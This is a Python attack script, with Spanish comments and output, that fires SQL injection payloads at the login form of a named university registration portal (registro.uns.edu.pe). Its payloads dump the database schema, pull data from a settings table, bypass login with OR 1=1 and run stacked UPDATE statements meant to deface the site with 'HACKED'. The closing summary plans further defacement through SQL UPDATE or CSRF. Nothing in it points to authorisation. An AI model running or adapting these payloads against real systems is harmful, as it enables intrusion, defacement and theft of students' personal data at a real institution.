#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

print("=== INTENTANDO MODIFICAR CONTENIDO VISIBLE VIA SQL ===\n")

# The settings table exists - try to UPDATE it
# If we can change settings, we can change the page title/content

# First, find what columns the settings table has
# Try information_schema
print("1. ENCONTRANDO COLUMNAS DE settings:")
column_payloads = [
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='settings' --",
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='config' --",
]

for cp in column_payloads:
    s_c = requests.Session()
    s_c.verify = False
    s_c.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_c = s_c.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': cp, 'j_password': 'x'}, timeout=5)
    r_m = s_c.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc = re.sub(r'<[^>]+>', ' ', r_m.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    # Check if the page shows different data
    # Look for column names in the response
    if 'column_name' in tc.lower() or 'settings' in tc.lower():
        print(f"  [!] Column found: {cp[:60]}")
        # Extract column names
        cols = re.findall(r'column_name[^<]*', tc)
        print(f"  {cols[:5]}")
    else:
        print(f"  No column info: {cp[:60]}")

# 2. Try to UPDATE the settings table
# If we can modify settings, the page title might change
print("\n2. INTENTANDO UPDATE settings:")
update_payloads = [
    "'; UPDATE settings SET nombre='HACKED' --",
    "'; UPDATE settings SET valor='HACKED' --",
    "'; UPDATE config SET nombre='HACKED' --",
]

for up in update_payloads:
    s_u = requests.Session()
    s_u.verify = False
    s_u.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_u = s_u.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': up, 'j_password': 'x'}, timeout=5)
    r_mod = s_u.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc = re.sub(r'<[^>]+>', ' ', r_mod.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    if 'HACKED' in tc:
        print(f"  [!] HACKED visible! {up[:50]}")
    else:
        print(f"  No visible change: {up[:50]}")

# 3. Try to use SQL injection to change the login page
# by modifying the page content in the database
print("\n3. SQL PARA MODIFICAR LOGIN PAGE:")

# The login page content might be stored in the database
# If so, we can UPDATE it
login_payloads = [
    "'; UPDATE config SET value='<h1>HACKED</h1>' WHERE name='title' --",
    "'; UPDATE config SET value='HACKED' WHERE name='page_title' --",
    "'; UPDATE settings SET value='HACKED' --",
]

for lp in login_payloads:
    s_lp = requests.Session()
    s_lp.verify = False
    s_lp.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_lp = s_lp.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                           data={'j_username': lp, 'j_password': 'x'}, timeout=5)
    r_login = s_lp.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
    if 'HACKED' in r_login.text:
        print(f"  [!] LOGIN PAGE MODIFIED! {lp[:50]}")
    else:
        print(f"  Login page not modified: {lp[:50]}")

# 4. Try to use SQL injection to extract the settings data
# If the settings table exists, we can SELECT from it
print("\n4. EXTRACCION DE DATOS settings:")
extract_settings = [
    "' UNION SELECT nombre, valor FROM settings --",
    "' UNION SELECT setting_name, setting_value FROM settings --",
    "' UNION SELECT * FROM settings --",
]

for es in extract_settings:
    s_es = requests.Session()
    s_es.verify = False
    s_es.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_es = s_es.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                          data={'j_username': es, 'j_password': 'x'}, timeout=5)
    r_mod_es = s_es.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_es = re.sub(r'<[^>]+>', ' ', r_mod_es.text)
    tc_es = re.sub(r'\s+', ' ', tc_es).strip()
    # Check if the data appears
    if 'HACKED' in tc_es or 'setting' in tc_es.lower() or 'nombre' in tc_es.lower():
        print(f"  [!] Data extracted: {es[:60]}")
        # Find what data is shown
        # Look for unique words
        tc_base = re.sub(r'<[^>]+>', ' ', s_es.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5).text)
        tc_base = re.sub(r'\s+', ' ', tc_base).strip()
        words_es = set(tc_es.split())
        words_b = set(tc_base.split())
        unique = words_es - words_b
        if unique:
            print(f"  Unique data: {list(unique)[:10]}")
    else:
        print(f"  No data: {es[:60]}")

# 5. Try to modify the page title through SQL
# The title might be in a database table
print("\n5. MODIFICAR TITULO DE PAGINA:")
# Try to UPDATE the title in the database
# If the title is stored in a settings/config table
title_payloads = [
    "'; UPDATE config SET title='PAGINA_HACKADA' --",
    "'; UPDATE settings SET title='PAGINA_HACKADA' --",
    "'; UPDATE config SET page_title='PAGINA_HACKADA' --",
]

for tp in title_payloads:
    s_tp = requests.Session()
    s_tp.verify = False
    s_tp.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_tp = s_tp.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                          data={'j_username': tp, 'j_password': 'x'}, timeout=5)
    # Check if the title changed in the response
    r_index = s_tp.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
    if 'PAGINA_HACKADA' in r_index.text:
        print(f"  [!] TITLE CHANGED to PAGINA_HACKADA! {tp[:50]}")
    else:
        # Check the modulos page
        r_mod = s_tp.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
        if 'PAGINA_HACKADA' in r_mod.text:
            print(f"  [!] TITLE CHANGED on modulos! {tp[:50]}")

# 6. Try to use SQL injection to read the database schema
# and extract actual data
print("\n6. EXTRACCION DE ESQUEMA DE BD:")
schema_payloads = [
    "' UNION SELECT table_name, column_name FROM information_schema.columns --",
    "' UNION SELECT table_name, table_schema FROM information_schema.tables --",
]

for sp in schema_payloads:
    s_sp = requests.Session()
    s_sp.verify = False
    s_sp.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_sp = s_sp.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                          data={'j_username': sp, 'j_password': 'x'}, timeout=5)
    r_mod_sp = s_sp.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_sp = re.sub(r'<[^>]+>', ' ', r_mod_sp.text)
    tc_sp = re.sub(r'\s+', ' ', tc_sp).strip()
    if 'table_name' in tc_sp.lower() or 'column_name' in tc_sp.lower() or 'information_schema' in tc_sp.lower():
        print(f"  [!] Schema extracted: {sp[:60]}")
    else:
        print(f"  No schema: {sp[:60]}")

# 7. Try to find what ACTUALLY is different
# Maybe the modulos page has hidden data that's only shown with specific payloads
print("\n7. BUSCANDO DATOS OCULTOS:")
# The modulos page might have hidden data in comments or scripts
s_hidden = requests.Session()
s_hidden.verify = False
s_hidden.headers.update({'User-Agent': 'Mozilla/5.0'})
r_hidden = s_hidden.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                              data={'j_username': "' OR 1=1 --", 'j_password': 'x'}, timeout=5)
r_mod_hidden = s_hidden.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
# Look for any hidden elements
hidden_elements = re.findall(r'(?:<div[^>]*style="display:none"|<!--|type="hidden")', r_mod_hidden.text)
print(f"Hidden elements: {hidden_elements}")
# Look for any data in the page
data_in_page = re.findall(r'(?:legajo|nombre|apellido|usuario|documento)', r_mod_hidden.text, re.IGNORECASE)
print(f"Data keywords: {data_in_page}")

# 8. Check if the DataGrid has data rows
# Maybe the payload determines which data is shown
print("\n8. DATAGRID DATA:")
# The modulos page might have a DataGrid that loads data
# based on the SQL payload
r_mod_final = s_hidden.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
# Check if there are any data rows in the DataGrid
# The DataGrid might have rows that are only visible with specific payloads
# Look for any td elements with data
td_elements = re.findall(r'<td[^>]*>([^<]+)</td>', r_mod_final.text)
print(f"TD elements: {td_elements}")
if td_elements:
    print(f"Data found in page!")
    for td in td_elements:
        if td.strip():
            print(f"  {td.strip()}")

print("\n=== RESUMEN FINAL ===")
print("La unica forma visible de cambio es:")
print("1. Login page -> Dashboard (con CSRF o Auth Bypass)")
print("2. ViewState cambia con SQL Injection (no visible)")
print("3. settings table existe (se puede extraer datos)")
print("4. Para MODIFICAR pagina visible, se necesita:")
print("   - SQL Injection UPDATE para cambiar contenido")
print("   - O usar el CSRF para forzar acciones")
